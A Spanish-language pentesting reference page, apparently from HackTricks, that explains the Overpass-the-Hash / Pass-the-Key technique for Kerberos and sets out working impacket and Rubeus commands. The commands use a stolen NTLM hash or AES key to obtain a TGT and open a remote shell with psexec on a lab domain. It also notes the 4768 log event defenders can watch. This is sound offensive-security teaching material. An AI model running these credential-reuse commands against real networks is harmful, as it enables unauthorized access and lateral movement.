## Overpass The Hash/Pass The Key (PTK)

Este ataque tiene como objetivo **utilizar el hash NTLM del usuario o las claves AES para solicitar tickets Kerberos**, como alternativa al común Pass The Hash sobre el protocolo NTLM. Por lo tanto, esto podría ser especialmente **útil en redes donde el protocolo NTLM está deshabilitado** y solo se permite **Kerberos como protocolo de autenticación**.

Para llevar a cabo este ataque, se necesita el **hash NTLM (o la contraseña) de la cuenta de usuario objetivo**. Por lo tanto, una vez que se obtiene el hash del usuario, se puede solicitar un TGT para esa cuenta. Finalmente, es posible **acceder** a cualquier servicio o máquina **donde la cuenta de usuario tenga permisos**.
```
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Puedes **especificar** `-aesKey [clave AES]` para usar **AES256**.\
También puedes usar el ticket con otras herramientas como smbexec.py o wmiexec.py.

Posibles problemas:

* _PyAsn1Error(‘NamedTypes can cast only scalar values’,)_ : Se resuelve actualizando impacket a la última versión.
* _KDC no puede encontrar el nombre_ : Se resuelve usando el nombre del host en lugar de la dirección IP, ya que no es reconocido por Kerberos KDC.
```
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Este tipo de ataque es similar a **Pass the Key**, pero en lugar de usar hashes para solicitar un ticket, el ticket en sí es robado y utilizado para autenticarse como su propietario.

{% hint style="warning" %}
Cuando se solicita un TGT, se genera el evento `4768: Se solicitó un ticket de autenticación Kerberos (TGT)`. Puede verse en la salida anterior que el tipo de clave es **RC4-HMAC** (0x17), pero el tipo predeterminado para Windows es ahora **AES256** (0x12).
{% endhint %}
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Referencias

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
